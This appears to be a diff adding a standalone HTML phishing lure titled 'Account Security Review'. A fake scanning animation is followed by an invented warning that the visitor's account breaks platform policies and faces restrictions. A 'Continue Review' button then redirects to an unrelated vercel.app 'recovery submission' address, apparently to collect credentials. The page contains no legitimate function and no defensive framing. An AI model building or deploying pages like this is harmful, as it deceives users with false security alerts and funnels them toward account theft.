@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Account Security Review</title>
+
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", Roboto, Arial, sans-serif;
+      background: linear-gradient(135deg, #eef2f7, #dfe6ee);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      background: #ffffff;
+      width: 100%;
+      max-width: 420px;
+      padding: 40px 32px;
+      border-radius: 14px;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.12);
+      text-align: center;
+    }
+
+    .header-title {
+      font-size: 22px;
+      font-weight: 600;
+      color: #1f2a37;
+      margin-bottom: 8px;
+    }
+
+    .header-subtitle {
+      font-size: 14px;
+      color: #5f6b7a;
+      margin-bottom: 28px;
+    }
+
+    .scanner-ring {
+      width: 170px;
+      height: 170px;
+      border-radius: 50%;
+      background: conic-gradient(#1976d2, #42a5f5, #64b5f6, #1976d2);
+      animation: spin 1.8s linear infinite;
+      margin: 0 auto 26px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .scanner-core {
+      width: 125px;
+      height: 125px;
+      background: #ffffff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 52px;
+      color: #2e7d32;
+    }
+
+    .scanner-complete {
+      animation: none;
+      background: #e8f5e9;
+      border: 3px solid #2e7d32;
+    }
+
+    .status-text {
+      font-size: 16px;
+      color: #1f2a37;
+      margin-bottom: 12px;
+    }
+
+    .verified-text {
+      display: none;
+      font-size: 15px;
+      line-height: 1.5;
+      color: #374151;
+      margin-top: 10px;
+    }
+
+    .verified-text strong {
+      color: #b91c1c;
+    }
+
+    .continue-btn {
+      display: none;
+      margin-top: 24px;
+      padding: 12px 30px;
+      background-color: #1976d2;
+      color: #ffffff;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.25s ease;
+    }
+
+    .continue-btn:hover {
+      background-color: #125ea4;
+    }
+
+    .footer-note {
+      margin-top: 22px;
+      font-size: 12px;
+      color: #6b7280;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="header-title">Account Security Review</div>
+    <div class="header-subtitle">Automated verification in progress</div>
+
+    <div class="scanner-ring" id="scannerRing">
+      <div class="scanner-core" id="scannerCore"></div>
+    </div>
+
+    <div class="status-text" id="statusText">
+      Verifying account activity and security signals…
+    </div>
+
+    <div class="verified-text" id="verifiedText">
+      We detected activity that may not comply with our platform policies.
+      <br><br>
+      To avoid temporary restrictions or permanent limitations,
+      please submit an appeal for manual review.
+      <br><br>
+      <strong>Action required:</strong> Continue to complete the review process.
+    </div>
+
+    <button class="continue-btn" id="continueBtn">
+      Continue Review
+    </button>
+
+    <div class="footer-note">
+      This security process helps protect user accounts and platform integrity.
+    </div>
+  </div>
+
+  <audio id="successSound"
+    src="https://assets.mixkit.co/sfx/preview/mixkit-confirmation-tone-2867.mp3"
+    preload="auto">
+  </audio>
+
+  <script>
+    const redirectURL = "https://take-action-recovery-submission-orcin.vercel.app/";
+
+    setTimeout(() => {
+      const ring = document.getElementById("scannerRing");
+      const core = document.getElementById("scannerCore");
+
+      ring.classList.add("scanner-complete");
+      core.textContent = "✔";
+
+      document.getElementById("statusText").style.display = "none";
+      document.getElementById("verifiedText").style.display = "block";
+      document.getElementById("continueBtn").style.display = "inline-block";
+
+      document.getElementById("successSound").play().catch(() => {});
+    }, 3500);
+
+    document.getElementById("continueBtn").addEventListener("click", () => {
+      window.location.href = redirectURL;
+    });
+  </script>
+
+</body>
+</html>
